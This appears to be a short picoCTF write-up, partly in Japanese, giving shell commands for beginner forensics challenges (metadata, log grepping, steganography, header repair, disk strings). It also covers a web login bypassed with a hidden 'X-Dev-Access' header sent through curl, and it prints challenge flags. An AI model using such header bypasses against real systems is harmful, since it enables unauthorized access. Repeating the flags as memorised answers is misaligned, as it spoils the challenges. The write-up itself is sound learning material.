# Easy

## Riddle Registry
```bash
file confidential.pdf
exiftool confidential.pdf
```

## Log Hunt
```bash
cat server.log
cat server.log | grep -i flagpart
cat server.log | grep -i flagpart | cut -d ' ' -f 5 | sort | uniq
```

## Hidden in plainsight
```bash
file img.jpg
file img.jpg | pcregrep -o '".*"' | tr -d '"' | base64 -d
file img.jpg | pcregrep -o '".*"' | tr -d '"' | base64 -d | pcregrep -o1 'steghide:(.*)' | base64 -d
steghide extract -sf img.jpg
```

## Flag in Flame
```bash
file logs.txt
cat logs.txt
cat logs.txt | base64 -d > logs
file logs
mv logs image.png
echo '7069636F4354467B666F72656E736963735F616E616C797369735F69735F616D617A696E675F35646161346132667D' | sed 's/../& /g'
```

## Corrupted file
```bash
xxd -l 32 file
# 00000000: 5c78 ffe0 0010 4a46 4946 0001 0100 0001  \x....JFIF......
# JPEG/JFIF: ff d8 ff e0
(printf '\xff\xd8' && tail -c + 3 file) > file.jpg
```

## DISKO 1
```bash
file disko-1.dd.gz
gunzip disko-1.dd.gz
file disko-1.dd
strings disko-1.dd | grep -i "picoctf"
```

## Crack the Gate 1
### webページへアクセス
1. デベロッパーツールから以下の文字列を発見
```
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```
2. 文字列の復号
    1. シーザー暗号: https://dencode.com/ja/cipher
    2. ROT13 https://dencode.com/ja/cipher/rot13
3. ヘッダーの追加
```bash
# <!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->
curl -X POST -H "X-Dev-Access: yes" -d 'email=ctf-player@picoctf.org&password=admin' http://amiable-citadel.picoctf.net:61058/login
# {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}
```

